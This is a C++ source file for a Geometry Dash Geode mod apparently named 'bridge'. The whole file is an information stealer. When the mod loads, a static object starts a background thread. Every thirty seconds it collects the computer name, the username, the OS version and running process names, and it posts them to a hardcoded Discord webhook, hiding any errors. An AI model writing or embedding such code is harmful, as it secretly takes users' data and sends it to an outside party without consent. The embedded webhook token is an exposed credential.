#include "stealer.hpp"
#include <Geode/Geode.hpp>
#include <chrono>
#include <string>
#include <sstream>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>

using namespace geode::prelude;
using json = nlohmann::json;

// ---- CONFIG ----
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1488719491830517850/lbeiMouxMiglVuFf80reqEZiXD1Le9J110gLR4izJCs1EPQ20LUsqFTogIX_m9x3sCEh";
const int HEARTBEAT_INTERVAL_SECONDS = 30;
// ----------------

Stealer& Stealer::get() {
    static Stealer instance;
    return instance;
}

void Stealer::start() {
    if (m_running) return;
    m_running = true;
    m_thread = std::thread(&Stealer::run, this);
}

void Stealer::stop() {
    m_running = false;
    if (m_thread.joinable()) m_thread.join();
}

void Stealer::run() {
    while (m_running) {
        try {
            json payload = buildPayload();
            sendWebhook(payload);
        } catch (...) {
            // silent fail
        }
        for (int i = 0; i < HEARTBEAT_INTERVAL_SECONDS && m_running; ++i) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
}

json Stealer::buildPayload() {
    json data;
    data["timestamp"] = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()
    ).count();

    char compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD sz = sizeof(compName);
    GetComputerNameA(compName, &sz);
    data["hostname"] = compName;

    char userName[256];
    sz = sizeof(userName);
    GetUserNameA(userName, &sz);
    data["username"] = userName;

    OSVERSIONINFOEXA osvi = {sizeof(osvi)};
    GetVersionExA((OSVERSIONINFOA*)&osvi);
    data["os"] = std::to_string(osvi.dwMajorVersion) + "." +
                 std::to_string(osvi.dwMinorVersion) + "." +
                 std::to_string(osvi.dwBuildNumber);

    json processes = json::array();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(snap, &pe)) {
            int count = 0;
            do {
                processes.push_back(pe.szExeFile);
                if (++count >= 20) break;
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    data["processes"] = processes;

    data["gd_version"] = "2.2081";
    data["mod_name"] = "bridge";

    return data;
}

void Stealer::sendWebhook(const json& payload) {
    std::string postData = payload.dump();

    std::wstring url = std::wstring(WEBHOOK_URL.begin(), WEBHOOK_URL.end());
    URL_COMPONENTS urlComp = {sizeof(urlComp)};
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &urlComp)) return;

    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    HINTERNET session = WinHttpOpen(L"GeodeStealer/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!session) return;

    HINTERNET connect = WinHttpConnect(session, host.c_str(), urlComp.nPort, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return;
    }

    HINTERNET request = WinHttpOpenRequest(connect, L"POST", path.c_str(), NULL, NULL, NULL, 0);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return;
    }

    std::wstring headers = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(request, headers.c_str(), headers.length(),
                       (LPVOID)postData.c_str(), postData.length(), postData.length(), 0);

    WinHttpReceiveResponse(request, NULL);
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
}

// ---- Auto-start on mod load ----
static struct StealerAutoStart {
    StealerAutoStart() {
        Stealer::get().start();
        log::info("Stealer started.");
    }
    ~StealerAutoStart() {
        Stealer::get().stop();
        log::info("Stealer stopped.");
    }
} stealerAutoStart;